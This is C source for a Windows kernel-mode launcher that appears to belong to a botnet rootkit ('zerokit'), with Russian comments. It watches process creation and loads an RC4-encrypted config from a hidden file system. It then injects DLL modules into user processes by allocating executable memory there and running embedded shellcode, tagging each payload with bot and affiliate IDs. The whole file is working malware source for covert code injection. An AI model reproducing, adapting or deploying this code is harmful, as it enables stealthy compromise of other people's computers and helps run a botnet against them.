#define WINLOGON_EXE_HASH 0x9aff1a23        // winlogon.exe
#define SERVICES_EXE_HASH 0x1B0F0E23        // services.exe
#define SVCHOST_EXE_HASH 0x9B4EDDA6         // svchost.exe
#define KERNEL32_DLL_HASH 0xc4aa9d02        // kernel32.dll - UNICODE
#define NTDLL_DLL_HASH 0x3259b431           // ntdll.dll - UNICODE
#define CSRSS_EXE 0x99cadd98                // csrss.exe
#define INJECT_SECTION_HASH 0x134266a9      // inject

#define OVERLORD32_DLL_HASH 0xF6D89830 // overlord32.dll
#define OVERLORD64_DLL_HASH 0xF6F89E30 // overlord64.dll

#include "zshellcode.h"

// typedef enum _KAPC_ENVIRONMENT {
//     OriginalApcEnvironment,
//     AttachedApcEnvironment,
//     CurrentApcEnvironment
// } KAPC_ENVIRONMENT;
// 
// 
// VOID apc_kernel_routine(PKAPC pApc, PKNORMAL_ROUTINE* NormalRoutine, void** NormalContext, void** SystemArgument1, void** SystemArgument2)
// {
//     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
//     USE_GLOBAL_BLOCK
// 
// #ifdef _WIN64
//         ntStatus = pGlobalBlock->pCommonBlock->fnPsWrapApcWow64Thread(NormalContext,(void**)NormalRoutine);
// #endif
// 
//     if (pApc != NULL) {
//         EX_FREE_POOL_WITH_TAG(pApc, ALLOCATOR_TAG);
//     }
// }

#include "r3_launchers\code\overlord_x32.c"
#include "r3_launchers\code\dll_mem_x32.c"
#include "r3_launchers\code\transit_launcher_x32.c"
#include "r3_launchers\code\ntdll_finder_x32.c"
#include "r3_launchers\code\export_finder_x32.c"
#ifdef _WIN64
#include "r3_launchers\code\overlord_x64.c"
#include "r3_launchers\code\dll_mem_x64.c"
#include "r3_launchers\code\transit_launcher_x64.c"
#include "r3_launchers\code\ntdll_finder_x64.c"
#include "r3_launchers\code\export_finder_x64.c"
#endif // _WIN64

#pragma comment(linker, "/MERGE:.rdata=.text")

void launcher_define_overlord_zfile(char* name, pzfile_list_entry_t pZfileEntry)
{
    uint32_t baseNameHash, len = 0;
    USE_GLOBAL_BLOCK

    baseNameHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)pGlobalBlock->pCommonBlock->fncommon_get_base_name(name, &len), len);

#ifdef _WIN64
    if (baseNameHash == OVERLORD64_DLL_HASH) {
        InterlockedExchange64((LONGLONG*)&pGlobalBlock->pLauncherBlock->pOverlordZfileEntry, (LONGLONG)pZfileEntry);
    }
#else
    if (baseNameHash == OVERLORD32_DLL_HASH) {
        InterlockedExchange((LONG*)&pGlobalBlock->pLauncherBlock->pOverlordZfileEntry, (LONG)pZfileEntry);
    }
#endif
}

void launcher_add_zfile_clone_for_process(pzfile_list_entry_t pZfileEntry, PEPROCESS pep, uint32_t nameHash)
{
    KIRQL x;
    pzfile_list_entry_t pNewFileItem;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pNewFileItem, sizeof(zfile_list_entry_t), NonPagedPool);

    __movsb((uint8_t*)pNewFileItem + sizeof(LIST_ENTRY), (uint8_t*)pZfileEntry + sizeof(LIST_ENTRY), sizeof(zfile_list_entry_t) - sizeof(LIST_ENTRY));
    pNewFileItem->processNameHash = nameHash;
    pNewFileItem->pEprocess = pep;
    InterlockedExchange(&pNewFileItem->runtimeState, ZRUNTIME_FLAG_NEW);

    x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);
    pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)&pGlobalBlock->pLauncherBlock->runningListHead, (PLIST_ENTRY)pNewFileItem);
    pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);

    // Выставляем индикатор ожидающих модулей.
    InterlockedExchange(&pGlobalBlock->pLauncherBlock->modulesPending, 1);
}

VOID launcher_create_process_notifier(IN HANDLE ParentId, IN HANDLE ProcessId, IN BOOLEAN Create)
{
    KIRQL x;
    PEPROCESS pEProcess = NULL;
    uint32_t nameHash;
    size_t len;
    char* moduleName;
    pzfile_list_entry_t pFileListHead;
    pzfile_list_entry_t pFileListItem;
    USE_GLOBAL_BLOCK

    if ((pGlobalBlock->shutdownToken != 0) || (pGlobalBlock->pCommonBlock->fnPsLookupProcessByProcessId(ProcessId, &pEProcess) != STATUS_SUCCESS)) {
        return;
    }

    if (Create == TRUE) {
        moduleName = (uint8_t*)pEProcess + pGlobalBlock->pLauncherBlock->dwImageFileName;
        len = pGlobalBlock->pCommonBlock->fncommon_strlen_s(moduleName, MAX_PROCESS_NAME_LEN);
        nameHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash(moduleName, len);

        x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList);
        // Ищем ZModule, которому нужен данный процесс.
        pFileListHead = &pGlobalBlock->pLauncherBlock->baseListHead;
        pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
        while (pFileListItem != pFileListHead) {
            if ((pFileListItem->processNameHash == 0x2A) || (pFileListItem->processNameHash == nameHash)) {
                pGlobalBlock->pLauncherBlock->fnlauncher_add_zfile_clone_for_process(pFileListItem, pEProcess, nameHash);
            }
            pFileListItem = (pzfile_list_entry_t)pFileListItem->Flink;
        }
        pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList, x);
    }
    else {
        x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);
        pFileListHead = &pGlobalBlock->pLauncherBlock->runningListHead;
        pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
        while (pFileListItem != pFileListHead) {
            if (pFileListItem->pEprocess == pEProcess) {
                InterlockedExchange(&pFileListItem->runtimeState, ZRUNTIME_FLAG_ZOMBI);
            }
            pFileListItem = (pzfile_list_entry_t)pFileListItem->Flink;
        }
        pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);
    }
}

uint8_t* launcher_load_config(uint32_t* pSize, pzfs_file_t* ppFile, uint8_t mode)
{
    int err;
    pzfs_file_t pFile = NULL;
    uint8_t* fileBuffer = NULL;
    uint32_t readed;
    uint32_t replies = 0;
    LARGE_INTEGER delay;
    uint32_t realSize;
    USE_GLOBAL_BLOCK

    delay.QuadPart = -30000000I64; // 3 секунды

    do {
        do {
            err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, pGlobalBlock->pCommonBlock->configPath, mode, 0);
            if (err == ERR_OK || ZFS_GETERROR(err) == ZFS_ERR_FILE_NOT_FOUND) {
                break;
            }
            pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
        } while (err != ERR_OK && ++replies < 7);

        if (err == ERR_OK) {
            realSize = (pFile->filesize != 0 ? pFile->filesize : 20);
            // Выделяем новый будер под конфигурационные блоки.
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &fileBuffer, realSize + *pSize, NonPagedPool);

            err = pGlobalBlock->pFsBlock->fnzfs_read(pFile, fileBuffer, pFile->filesize, &readed);
            if (err != ERR_OK || readed != pFile->filesize) {
                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(fileBuffer, LOADER_TAG);
                fileBuffer = NULL;
                break;
            }

            if (pFile->filesize > 0) {
                uint8_t sha1Hash[20];
                // Дешифруем содержимое считанного буфера. Ключ находится в первых 20 байтах.
                pGlobalBlock->pCommonBlock->fnarc4_crypt_self(fileBuffer, pFile->filesize, pGlobalBlock->pCommonBlock->configKey, sizeof(pGlobalBlock->pCommonBlock->configKey));
                pGlobalBlock->pCommonBlock->fnsha1(fileBuffer + 20, pFile->filesize - 20, sha1Hash);

//                 if (!MEMCMP(sha1Hash, fileBuffer, 20)) {
//                     // Файл оказался повреждённым. Восстанавливаем и пытаемся заново.
//                     pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(fileBuffer, LOADER_TAG);
//                 }
            }
            *pSize += realSize;
        }
    } while (0);

    if ((err != ERR_OK || ppFile == NULL) && pFile) {
        pGlobalBlock->pFsBlock->fnzfs_close(pFile);
    }

    if (ppFile != NULL) {
        *ppFile = pFile;
    }

    return fileBuffer;
}

void launcher_save_config(pzfs_file_t pFile, uint8_t* pBuffer, uint32_t size)
{
    uint32_t written;
    USE_GLOBAL_BLOCK

    if (pGlobalBlock->pFsBlock->fnzfs_seek(pFile, 0, ZFS_SEEK_SET) == ERR_OK) {
        pGlobalBlock->pCommonBlock->fnsha1(pBuffer + 20, size, pBuffer);
        // Шифруем содержимое считанного ранее буфера.
        pGlobalBlock->pCommonBlock->fnarc4_crypt_self(pBuffer, size + 20, pGlobalBlock->pCommonBlock->configKey, sizeof(pGlobalBlock->pCommonBlock->configKey));
        pGlobalBlock->pFsBlock->fnzfs_write(pFile, pBuffer, size + 20, &written);
    }
    pGlobalBlock->pFsBlock->fnzfs_close(pFile);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pBuffer, LOADER_TAG);

    // Обновляем дату последнего изменения конфига.
    pGlobalBlock->pFsBlock->fnzfs_get_time(pGlobalBlock->pFsBlock->pZfsIo, pGlobalBlock->pCommonBlock->configPath, ETimeMod, &pGlobalBlock->pLauncherBlock->configUnixTime, 0);
}

uint8_t* launcher_load_file(const char* name, uint32_t nameSize, uint32_t* pSize)
{
    int err;
    pzfs_file_t pFile;
    uint8_t* fileBuffer = NULL;
    uint32_t readed;
    uint32_t i;
    uint32_t hashVal;
    pfile_hash_entry_t pFileEntry;
    USE_GLOBAL_BLOCK

    do {
        if (!pGlobalBlock->pLogicBlock->useFs) {
            break;
        }

        hashVal = pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)name, nameSize);

        // Пробегаемся по хеш таблице в поисках нашего файла.
        pFileEntry = pGlobalBlock->pLauncherBlock->pFilesHashTable;
        for (i = 0; i < 7; ++i) {
            if (pFileEntry->hashVal == hashVal) {
                *pSize = pFileEntry->fileSize;
                return pFileEntry->fileBuffer;
            }
            ++pFileEntry;
        }

        // Считываем файл с диска.
        err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, name, ZFS_MODE_READ, 0);
        if (err != ERR_OK) {
            break;
        }

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &fileBuffer, pFile->filesize, NonPagedPool);
        err = pGlobalBlock->pFsBlock->fnzfs_read(pFile, fileBuffer, pFile->filesize, &readed);
        if (err != ERR_OK || readed != pFile->filesize) {
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(fileBuffer, LOADER_TAG);
            fileBuffer = NULL;
            break;
        }

        // Добавляем файл в хеш-таблицу.
        pFileEntry = pGlobalBlock->pLauncherBlock->pFilesHashTable;
        for (i = 0; i < 7; ++i) {
            if (pFileEntry->hashVal == 0) {
                break;
            }
            ++pFileEntry;
        }

        if (i >= 7) {
            pFileEntry = pGlobalBlock->pLauncherBlock->pFilesHashTable;
            // Освобождаем текущий буфер.
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileEntry->fileBuffer, LOADER_TAG);
        }

        pFileEntry->hashVal = hashVal;
        pFileEntry->fileBuffer = fileBuffer;
        pFileEntry->fileSize = *pSize = pFile->filesize;
    } while (0);

    pGlobalBlock->pFsBlock->fnzfs_close(pFile);

    return fileBuffer;
}

void launcher_process_config_entries(pzautorun_config_entry_t pConfigBlock, uint32_t blocksCount, bool_t needLaunch)
{
    KIRQL x;
    pzautorun_config_entry_t pConfigBlock1;
    pzfile_list_entry_t pFileListHead;
    pzfile_list_entry_t pFileListItem = NULL;
    uint32_t i;
    bool_t ret;
    PEPROCESS pep;
    uint32_t wNameHash;
    USE_GLOBAL_BLOCK

    // Первым делом, необходимо выгрузить все модули, которые обновились.
    for (i = 0, pConfigBlock1 = pConfigBlock; i < blocksCount; ++i, ++pConfigBlock1) {
#ifndef _WIN64
            // В 32-битной системе делаем проверку на разрядность самой DLL и пропускаем если она 64-битная.
        if (!(pConfigBlock1->flags & FLAG_IS64))
#endif // !_WIN64
        {
            x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList);
            // Пробегаемся по всему списку имеющихся модулей и удаляем
            pFileListHead = &pGlobalBlock->pLauncherBlock->baseListHead;
            pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
            while (pFileListItem != pFileListHead) {
                if ((pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->fileName)) ==
                    pGlobalBlock->pCommonBlock->fncommon_calc_hash(pFileListItem->name, pGlobalBlock->pCommonBlock->fnstrlen(pFileListItem->name)))) {

                    if ((pConfigBlock1->processName[0] == 0x2A && pFileListItem->processNameHash == 0x2A) || (pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->processName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->processName)) == pFileListItem->processNameHash)) {
                        pConfigBlock1->flags |= TFLAG_EXISTING;
                    }
                    else {
                        // Удаляем модуль из списка, т. к. он имеет отличный от нового модуля совпадения.
                        pzfile_list_entry_t pTmpItem;

                        pConfigBlock1->flags &= ~TFLAG_EXISTING;

                        pTmpItem = (pzfile_list_entry_t)pFileListItem->Blink;
                        ret = pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pFileListItem);

                        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileListItem, LOADER_TAG);

                        if (ret) {
                            break;
                        }

                        pFileListItem = pTmpItem;
                    }
                }
                pFileListItem = (pzfile_list_entry_t)pFileListItem->Flink;
            }
            pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList, x);

            // Пробегаемся по всему списку запущеных модулей.
            x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);
            pFileListHead = &pGlobalBlock->pLauncherBlock->runningListHead;
            pFileListItem = (pzfile_list_entry_t)pFileListHead->Flink;
            while (pFileListItem != pFileListHead) {
                if ((pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->fileName)) ==
                    pGlobalBlock->pCommonBlock->fncommon_calc_hash(pFileListItem->name, pGlobalBlock->pCommonBlock->fnstrlen(pFileListItem->name)))) {

                    if (pFileListItem->runtimeState == ZRUNTIME_FLAG_LOADED) {
                        if (pConfigBlock1->processName[0] == 0x2A || (pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->processName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->processName)) == pFileListItem->processNameHash)) {
                            InterlockedExchange(&pFileListItem->runtimeState, ZRUNTIME_FLAG_RELOAD);
                        }
                        else {
                            InterlockedExchange(&pFileListItem->runtimeState, ZRUNTIME_FLAG_UNLOAD);
                        }
                        // Устанавливаем индикатор ожидающих модулей.
                        InterlockedExchange(&pGlobalBlock->pLauncherBlock->modulesPending, 1);
                    }
                }
                pFileListItem = (pzfile_list_entry_t)pFileListItem->Flink;
            }
            pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);
        }
    }

    // Теперь инициализируем списки новыми модулями.
    for (i = 0, pConfigBlock1 = pConfigBlock; i < blocksCount; ++i, ++pConfigBlock1) {
        if (!(pConfigBlock1->flags & TFLAG_EXISTING)
#ifndef _WIN64
        // В 32-битной системе игнорируем 64-битные модули.
        && !(pConfigBlock1->flags & FLAG_IS64)
#endif // !_WIN64
        ) {
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pFileListItem, sizeof(zfile_list_entry_t), NonPagedPool);
            pFileListItem->flags = pConfigBlock1->flags;
            // Выставляем бит, для того, чтобы потом обработать его во вспомогательном потоке.
            MEMCPY(pFileListItem->name, pConfigBlock1->fileName, sizeof(pFileListItem->name));
            pFileListItem->processNameHash = wNameHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->processName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->processName));

            x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList);
            pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)&pGlobalBlock->pLauncherBlock->baseListHead, (PLIST_ENTRY)pFileListItem);
            pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slBaseList, x);

            if (needLaunch) {
                pep = NULL;
                while (pep = pGlobalBlock->pLauncherBlock->fnlauncher_find_user_thread_by_hash(wNameHash, pep, NULL)) {
                    pzfile_list_entry_t pTmpListItem;
                    x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);
                    pFileListHead = &pGlobalBlock->pLauncherBlock->runningListHead;
                    pTmpListItem = (pzfile_list_entry_t)pFileListHead->Flink;
                    while (pTmpListItem != pFileListHead) {
                        if (pTmpListItem->pEprocess == pep && (pGlobalBlock->pCommonBlock->fncommon_calc_hash(pFileListItem->name, pGlobalBlock->pCommonBlock->fnstrlen(pFileListItem->name)) ==
                            pGlobalBlock->pCommonBlock->fncommon_calc_hash(pTmpListItem->name, pGlobalBlock->pCommonBlock->fnstrlen(pTmpListItem->name)))) {
                            break;
                        }
                        pTmpListItem = (pzfile_list_entry_t)pTmpListItem->Flink;
                    }
                    pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);

                    if (pTmpListItem == pFileListHead) {
                        pGlobalBlock->pLauncherBlock->fnlauncher_add_zfile_clone_for_process(pFileListItem, pep, pFileListItem->processNameHash);
                    }
                }
            }
        }
    }
}

uint32_t launcher_process_zfile(pzfile_list_entry_t pZfileEntry)
{
    NTSTATUS ntStatus;
    HANDLE hProcess;
    KAPC_STATE apcState;
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    uint32_t result = 0;
    size_t moduleSize;
    uint32_t realModuleSize;
    uint8_t* r3ModuleBuffer = NULL;
    uint8_t* moduleBuffer = pZfileEntry->fileBuffer;
    uint8_t* shellcodePtr;
    uint32_t shellcodeSize;
    ulong_t numberOfBytesWritten;
    LARGE_INTEGER maxDelay;
    pexec_info_t pExecInfo = NULL;
    pdll_info_t pDllInfo = NULL;
#ifdef _WIN64
    ULONG_PTR isWow64 = 0;
    pexec64_info_t pExec64Info = NULL;
    pdll64_info_t pDll64Info = NULL;
#endif // _WIN64
    size_t outSize = 0;
    uint32_t pageSize;
    PEPROCESS pep = pZfileEntry->pEprocess;
    pclient_entry_t pClientEntry = NULL;
    USE_GLOBAL_BLOCK

    pageSize = pGlobalBlock->systemInfo.PageSize;

    do {
        pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);

        // Получаем описатель процесса.
        ntStatus = pGlobalBlock->pCommonBlock->fnObOpenObjectByPointer(pep, OBJ_KERNEL_HANDLE, NULL, SYNCHRONIZE, *pGlobalBlock->pCommonBlock->pPsProcessType, KernelMode, &hProcess);
        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

#ifdef _WIN64
        // Проверяем является ли процесс 64-битным.
        if (!NT_SUCCESS(ntStatus = pGlobalBlock->pCommonBlock->fnNtQueryInformationProcess(hProcess, ProcessWow64Information, &isWow64, sizeof(ULONG_PTR), NULL))) {
            break;
        }
#endif // _WIN64

#ifdef _WIN64
        if ((isWow64 == 0 && !(pZfileEntry->flags & FLAG_IS64)) || (isWow64 != 0 && (pZfileEntry->flags & FLAG_IS64))) {
            break;
        }
#endif // _WIN64

        if (pZfileEntry->runtimeState != ZRUNTIME_FLAG_UNLOAD) {
            realModuleSize = moduleSize = pZfileEntry->bufferSize;
            // Выделяем место в контексте процесса для модуля.
            ntStatus = pGlobalBlock->pCommonBlock->fnNtAllocateVirtualMemory(hProcess, &r3ModuleBuffer, 0, &((size_t)moduleSize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!NT_SUCCESS(ntStatus)) {
                break;
            }
            
            // Копируем тело модуля в память процесса.
            MEMCPY(r3ModuleBuffer, moduleBuffer, realModuleSize);
            moduleBuffer = r3ModuleBuffer;

            dosHdr = (PIMAGE_DOS_HEADER)moduleBuffer;
            if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
                break;
            }

            ntHdrs = (PIMAGE_NT_HEADERS)(moduleBuffer + dosHdr->e_lfanew);
            if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
                break;
            }

#ifdef _WIN64
            if (isWow64 == 0) {
                if (ntHdrs->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
                    break;
                }
            }
            else
#endif // _WIN64
            {
                if (ntHdrs->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
                    break;
                }
            }

        }

#ifdef _WIN64
        if (isWow64 == 0) {
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pExec64Info, pageSize, NonPagedPool);
        }
        else
#endif // _WIN64
        {
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pExecInfo, pageSize, NonPagedPool);
        }

#ifdef _WIN64
        if (isWow64 == 0) {
            shellcodePtr = (uint8_t*)pGlobalBlock->pLauncherBlock->scDllMem64;
            shellcodeSize = sizeof(sc_dll_mem_x64);
        }
        else
#endif // _WIN64
        {
            shellcodePtr = (uint8_t*)pGlobalBlock->pLauncherBlock->scDllMem32;
            shellcodeSize = sizeof(sc_dll_mem_x32);
        }

        {
            PEPROCESS pEPWinLogon;
            PROCESS_BASIC_INFORMATION pbi;

            pEPWinLogon = pGlobalBlock->pLauncherBlock->fnlauncher_find_user_thread_by_hash(WINLOGON_EXE_HASH, NULL, NULL);

            // Получаем идентификатор родительского процесса.
            ntStatus = pGlobalBlock->pCommonBlock->fnNtQueryInformationProcess(hProcess, ProcessBasicInformation, (void*)&pbi, sizeof(PROCESS_BASIC_INFORMATION), &numberOfBytesWritten);
            if (ntStatus != STATUS_SUCCESS) {
                break;
            }
#ifdef _WIN64
            if (isWow64 == 0) {
                pExec64Info->winlogonProcId = (uint32_t)pbi.UniqueProcessId;
                if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_NEW || pZfileEntry->runtimeState == ZRUNTIME_FLAG_RELOAD) {
                    pExec64Info->moduleBuffer = moduleBuffer;
                    pExec64Info->moduleSize = realModuleSize;
                }

                if ((pZfileEntry->runtimeState == ZRUNTIME_FLAG_RELOAD || pZfileEntry->runtimeState == ZRUNTIME_FLAG_UNLOAD) && (pZfileEntry->dllBase != NULL)) {
                    pExec64Info->prevModuleBuffer = pZfileEntry->dllBase;
                    pExec64Info->prevModuleSize = pZfileEntry->dllSize;
                }
            }
            else
#endif // _WIN64
            {
                pExecInfo->winlogonProcId = (uint32_t)pbi.UniqueProcessId;
                if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_NEW || pZfileEntry->runtimeState == ZRUNTIME_FLAG_RELOAD) {
                    pExecInfo->moduleBuffer = (uint32_t)moduleBuffer;
                    pExecInfo->moduleSize = realModuleSize;
                }

                if ((pZfileEntry->runtimeState == ZRUNTIME_FLAG_RELOAD || pZfileEntry->runtimeState == ZRUNTIME_FLAG_UNLOAD) && (pZfileEntry->dllBase != NULL)) {
                    pExecInfo->prevModuleBuffer = (uint32_t)pZfileEntry->dllBase;
                    pExecInfo->prevModuleSize = pZfileEntry->dllSize;
                }
            }
        }

        maxDelay.QuadPart = -600000000I64; // Ждём 1 минуту.

#ifdef _WIN64
        if (isWow64 == 0) {
            // Если у нас DLL, создаём клиента для файловой системы.
            if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_NEW) {
                pClientEntry = pGlobalBlock->pUserioBlock->fnuserio_add_client(pZfileEntry->name);
                __movsb(pExec64Info->clientId, pClientEntry->clientId, sizeof(pClientEntry->clientId));
            }
            else {
                __movsb(pExec64Info->clientId, pZfileEntry->clientId, sizeof(pClientEntry->clientId));
            }

            __movsb(pExec64Info->botId, pGlobalBlock->pCommonBlock->pConfig->botId, LOADER_ID_SIZE);
            pExec64Info->affId = pGlobalBlock->pCommonBlock->zerokitHeader.affid;
            pExec64Info->subId = pGlobalBlock->pCommonBlock->zerokitHeader.subid;

            pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);
            result = pGlobalBlock->pLauncherBlock->fnlauncher_execute_shellcode(pep, shellcodePtr, shellcodeSize, (uint8_t*)pExec64Info, pageSize, (uint8_t**)&pDll64Info, (uint32_t*)&outSize, &maxDelay, FALSE);
            pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);
        }
        else
#endif // _WIN64
        {
            // Если у нас DLL, создаём клиента для файловой системы.
            if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_NEW) {
                pClientEntry = pGlobalBlock->pUserioBlock->fnuserio_add_client(pZfileEntry->name);
                __movsb(pExecInfo->clientId, pClientEntry->clientId, sizeof(pClientEntry->clientId));
            }
            else {
                __movsb(pExecInfo->clientId, pZfileEntry->clientId, sizeof(pClientEntry->clientId));
            }

            __movsb(pExecInfo->botId, pGlobalBlock->pCommonBlock->pConfig->botId, LOADER_ID_SIZE);
            pExecInfo->affId = pGlobalBlock->pCommonBlock->zerokitHeader.affid;
            pExecInfo->subId = pGlobalBlock->pCommonBlock->zerokitHeader.subid;

            pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);
            result = pGlobalBlock->pLauncherBlock->fnlauncher_execute_shellcode(pep, shellcodePtr, shellcodeSize, (uint8_t*)pExecInfo, pageSize, (uint8_t**)&pDllInfo, (uint32_t*)&outSize, &maxDelay, FALSE);
            pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);
        }

        if (result & SC_RESULT_CRASH) {
            // В данном случае, скорее всего закрешился процесс.
            r3ModuleBuffer = NULL;
            pGlobalBlock->pUserioBlock->fnuserio_remove_client(pZfileEntry->name);
            break;
        }

        if (result == SC_RESULT_OK) {
            if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_UNLOAD) {
                pGlobalBlock->pUserioBlock->fnuserio_remove_client(pZfileEntry->name);
            }
            else {
                if (pZfileEntry->runtimeState == ZRUNTIME_FLAG_NEW) {
                    MEMCPY(pZfileEntry->clientId, pClientEntry->clientId, sizeof(pClientEntry->clientId));
                }
#if _WIN64
                if (isWow64 == 0) {
                    pZfileEntry->dllBase = pDll64Info->moduleBuffer;
                    pZfileEntry->dllSize = pDll64Info->moduleSize;
                }
                else
#endif // _WIN64
                {
                    pZfileEntry->dllBase = (pvoid_t)pDllInfo->moduleBuffer;
                    pZfileEntry->dllSize = pDllInfo->moduleSize;
                }
            }
        }
        else if (result == SC_RESULT_BAD) {
            // В случае, когда result = 0 не ясно, что именно произошло, поэтому лучше ничего не удалять.
            pGlobalBlock->pUserioBlock->fnuserio_remove_client(pZfileEntry->name);
        }
    } while (0);

    if (result == 0) {
        // Освобождаем ранее выделенную в процессе память.
        if (r3ModuleBuffer != NULL) {
            pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &r3ModuleBuffer, &moduleSize, MEM_RELEASE);
        }

        result = SC_RESULT_BAD;
    }

#ifdef _WIN64
    if (pDll64Info != NULL) {
        pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &pDll64Info, &outSize, MEM_RELEASE);
    }
    else
#endif
    if (pDllInfo != NULL) {
        pGlobalBlock->pCommonBlock->fnZwFreeVirtualMemory(hProcess, &pDllInfo, &outSize, MEM_RELEASE);
    }

    pGlobalBlock->pCommonBlock->fnZwClose(hProcess); 
    pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);

#ifdef _WIN64
    if (pExec64Info != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pExec64Info, LOADER_TAG);
    }
    else
#endif
    if (pExecInfo != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pExecInfo, LOADER_TAG);
    }

    return result;
}
